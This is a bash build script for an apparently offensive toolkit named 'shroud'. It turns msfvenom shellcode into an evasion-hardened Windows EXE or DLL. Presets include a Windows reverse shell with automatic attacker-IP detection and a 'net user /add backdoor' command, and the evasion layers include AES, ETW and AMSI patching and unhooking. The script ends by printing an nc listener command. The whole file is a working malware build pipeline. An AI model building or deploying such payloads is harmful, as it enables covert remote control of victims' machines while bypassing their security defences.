#!/usr/bin/env bash
#
# build.sh — one-shot pipeline: msfvenom shellcode -> shroud hardened EXE.
#
#   ./build.sh                                   # calc pop test (default)
#   ./build.sh revshell                          # reverse shell, LHOST auto-detected, port 4444
#   ./build.sh revshell 4444                     # auto LHOST, custom port
#   ./build.sh revshell 10.10.14.5 4444          # explicit LHOST + port
#   ./build.sh revshell --iface tun0             # force the interface to read LHOST from
#   ./build.sh exec "net user /add backdoor P@ss"
#   ./build.sh raw ./myshellcode.bin             # bring-your-own shellcode
#
#   options (anywhere):  -e <evasion>  -t <tech>  -f exe|dll  -o <name>
#                        --process <exe>  --iface <iface>  --public  --no-build
#
#   LHOST auto-detect order: --public -> --iface -> tun0 (VPN) -> default-route
#   iface -> ifconfig  (skips loopback, link-local, and docker bridges)
#   --public = use the box's PUBLIC ip (curl ifconfig.me) — needed on a NAT'd VPS.
#
set -euo pipefail
cd "$(dirname "$0")"

# ---- defaults ---------------------------------------------------------------
PRESET="calc"
PRESET_ARGS=()
TECH="pe26"
EVASION="aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd"
FORMAT="exe"
NAME=""
PROCESS=""
IFACE=""
PUBLIC=0
NOBUILD=0

usage() {
  sed -n '3,21p' "$0" | sed 's/^# \{0,1\}//'
}

# ---- parse args -------------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -e)         EVASION="$2";    shift 2;;
    -t)         TECH="$2";       shift 2;;
    -f)         FORMAT="$2";     shift 2;;
    -o)         NAME="$2";       shift 2;;
    --process)  PROCESS="$2";    shift 2;;
    -p)         PROCESS="$2";    shift 2;;
    --iface)    IFACE="$2";      shift 2;;
    -i)         IFACE="$2";      shift 2;;
    --public)   PUBLIC=1;        shift;;
    --no-build) NOBUILD=1;       shift;;
    -h|--help)  usage; exit 0;;
    calc|revshell|exec|raw) PRESET="$1"; shift;;
    -*) echo "unknown option: $1" >&2; usage; exit 1;;
    *)  PRESET_ARGS+=("$1"); shift;;
  esac
done

# ---- dependency checks ------------------------------------------------------
need() { command -v "$1" >/dev/null 2>&1 || { echo "missing dependency: $1 ($2)" >&2; exit 1; }; }

if [ "$PRESET" != "raw" ]; then
  need msfvenom "apt install metasploit-framework"
fi
need x86_64-w64-mingw32-gcc "apt install mingw-w64"
[ -x ./shroud ] || { echo "run this from the shroud repo root (./shroud not found)" >&2; exit 1; }

if [[ "$EVASION" == *aes* ]]; then
  python3 -c "import Crypto" 2>/dev/null || {
    echo "AES layer needs pycryptodome — installing:" >&2
    pip install --quiet pycryptodome
  }
fi

# one-time authorization gate (records a local marker; prints nothing loud)
if [ ! -f ~/.shroud_authorized ]; then
  ./shroud authorize < /dev/null >/dev/null 2>&1 || true
fi

# ---- LHOST auto-detection ---------------------------------------------------
# Sets globals PICK_IFACE / PICK_IP. Order: explicit --iface -> tun0 (VPN) ->
# default-route interface -> ifconfig fallback. Skips loopback, link-local,
# and docker bridges.
pick_addr() {
  PICK_IFACE=""; PICK_IP=""
  _ip4_of() { ip -4 addr show "$1" 2>/dev/null | awk '/inet /{sub(/\/.*/,"",$2);print $2;exit}'; }

  # --public: use the box's public IP (required on a NAT'd VPS so the target
  # can actually reach your listener over the internet)
  if [ "$PUBLIC" -eq 1 ]; then
    if command -v curl >/dev/null 2>&1; then
      PICK_IP=$(curl -s --max-time 6 https://ifconfig.me 2>/dev/null \
                || curl -s --max-time 6 https://icanhazip.com 2>/dev/null \
                || true)
      PICK_IP="${PICK_IP//[[:space:]]/}"
      [ -n "$PICK_IP" ] && PICK_IFACE="(public via ifconfig.me)"
    fi
    return
  fi

  if [ -n "$IFACE" ] && command -v ip >/dev/null 2>&1; then
    PICK_IFACE="$IFACE"; PICK_IP="$(_ip4_of "$IFACE")"
  fi
  if [ -z "$PICK_IP" ] && command -v ip >/dev/null 2>&1; then
    if ip -4 addr show tun0 2>/dev/null | grep -q 'inet '; then
      PICK_IFACE="tun0"; PICK_IP="$(_ip4_of tun0)"
    fi
  fi
  if [ -z "$PICK_IP" ] && command -v ip >/dev/null 2>&1; then
    local di; di=$(ip route show default 2>/dev/null | awk '/default/{print $5;exit}')
    if [ -n "$di" ]; then PICK_IFACE="$di"; PICK_IP="$(_ip4_of "$di")"; fi
  fi
  if [ -z "$PICK_IP" ] && command -v ifconfig >/dev/null 2>&1; then
    PICK_IP=$(ifconfig 2>/dev/null \
      | grep -oE 'inet (addr:)?[0-9.]+' | sed -E 's/inet (addr:)?//' \
      | grep -vE '^(127\.|169\.254\.|172\.1[6-9]\.)' | head -1)
    [ -n "$PICK_IP" ] && PICK_IFACE="(ifconfig)"
  fi
}

list_addrs() {
  if command -v ip >/dev/null 2>&1; then
    echo "  available addresses (-i <iface> to force one):"
    ip -4 -o addr show 2>/dev/null \
      | awk '$2!="lo"{sub(/\/.*/,"",$4); print "    "$2"  "$4}'
  fi
}

# ---- 1. produce raw shellcode -----------------------------------------------
SC="$(mktemp --suffix=.bin)"
trap 'rm -f "$SC"' EXIT
case "$PRESET" in
  calc)
    echo ">> generating shellcode: windows/x64/exec CMD=calc.exe"
    msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o "$SC" EXITFUNC=thread 2>/dev/null
    [ -n "$NAME" ] || NAME="calc"
    ;;
  revshell)
    # accept:  revshell | revshell <port> | revshell <lhost> | revshell <lhost> <port>
    a1="${PRESET_ARGS[0]:-}"; a2="${PRESET_ARGS[1]:-}"
    if [ -n "$a2" ]; then LHOST="$a1"; LPORT="$a2"
    elif [ -n "$a1" ]; then
      if [[ "$a1" == *.* ]]; then LHOST="$a1"; LPORT="4444"   # looks like an IP
      else LHOST=""; LPORT="$a1"; fi                            # all digits -> port
    else LHOST=""; LPORT="4444"; fi
    # auto-detect LHOST if not given
    if [ -z "$LHOST" ]; then
      pick_addr
      if [ -z "$PICK_IP" ]; then
        echo "could not auto-detect your IP. pass it explicitly:" >&2
        echo "  ./build.sh revshell <LHOST> [LPORT]   (or  --iface <iface>)" >&2
        list_addrs >&2; exit 1
      fi
      LHOST="$PICK_IP"
      echo ">> auto-detected LHOST: $LHOST  (iface: ${PICK_IFACE:-ifconfig})"
      list_addrs
    fi
    echo ">> generating shellcode: windows/x64/shell_reverse_tcp $LHOST:$LPORT"
    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$SC" EXITFUNC=thread 2>/dev/null
    [ -n "$NAME" ] || NAME="revshell_${LHOST}_${LPORT}"
    ;;
  exec)
    CMD="${PRESET_ARGS[0]:-}"
    if [ -z "$CMD" ]; then echo "exec needs a command: ./build.sh exec \"<cmd>\"" >&2; exit 1; fi
    echo ">> generating shellcode: windows/x64/exec CMD=\"$CMD\""
    msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o "$SC" EXITFUNC=thread 2>/dev/null
    [ -n "$NAME" ] || NAME="exec"
    ;;
  raw)
    SRC="${PRESET_ARGS[0]:-}"
    [ -f "$SRC" ] || { echo "shellcode file not found: $SRC" >&2; exit 1; }
    cp "$SRC" "$SC"
    echo ">> using supplied shellcode: $SRC ($(wc -c <"$SC") bytes)"
    [ -n "$NAME" ] || NAME="custom"
    ;;
esac
echo "   shellcode: $(wc -c <"$SC") bytes"

# ---- 2. generate + build via shroud -----------------------------------------
PROJ="out/build_${NAME}"
GEN_ARGS=(generate "$TECH" -s "$SC" -e "$EVASION" -f "$FORMAT" -o "$PROJ")
[ -n "$PROCESS" ] && GEN_ARGS+=(--process "$PROCESS")
[ "$NOBUILD" -eq 1 ] && GEN_ARGS+=(--no-build)

echo ">> shroud ${GEN_ARGS[*]}"
./shroud "${GEN_ARGS[@]}" | sed 's/^/   /'

# ---- 3. copy the final artifact somewhere obvious ---------------------------
if [ "$FORMAT" == "c" ] || [ "$NOBUILD" -eq 1 ]; then
  echo
  echo "==============================================="
  echo " DONE (source only) -> $PROJ/"
  echo "   cd $PROJ && make"
  echo "==============================================="
  exit 0
fi

mkdir -p dist
EXT="$FORMAT"            # exe | dll
SRC_EXE="$PROJ/$(basename "$PROJ").$EXT"
[ -f "$SRC_EXE" ] || SRC_EXE="$(ls "$PROJ"/*.$EXT | head -1)"
FINAL="dist/${NAME}.${EXT}"
cp "$SRC_EXE" "$FINAL"

echo
echo "==============================================="
echo " DONE -> $FINAL   ($(wc -c <"$FINAL") bytes)"
echo " technique: $TECH"
echo " evasion  : $EVASION"
if [ "$PRESET" == "revshell" ]; then
  echo " listener : nc -lvnp ${LPORT}"
fi
echo "==============================================="
